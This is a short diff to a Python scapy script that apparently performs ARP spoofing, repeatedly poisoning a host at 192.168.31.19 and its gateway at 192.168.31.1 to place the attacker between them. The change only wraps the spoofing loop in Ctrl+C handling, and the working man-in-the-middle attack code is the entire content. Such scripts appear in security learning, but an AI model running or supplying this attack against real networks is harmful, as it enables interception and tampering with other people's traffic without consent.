@@ -27,10 +27,14 @@ def spoof(targetip,sourceip):
     scapy.send(packet, verbose=False)
 
 packets = 0
-while True:
-    packets = packets+2
-    spoof("192.168.31.19", "192.168.31.1")
-    spoof("192.168.31.1", "192.168.31.19")
-    print("\r[+] Packets sent: " + str(packets), end="")
-    time.sleep(2)
+
+try:
+    while True:
+        packets = packets+2
+        spoof("192.168.31.19", "192.168.31.1")
+        spoof("192.168.31.1", "192.168.31.19")
+        print("\r[+] Packets sent: " + str(packets), end="")
+        time.sleep(2)
+except KeyboardInterrupt: 
+    print("\n[+] Detected ctrl+c. Quitting..")
 
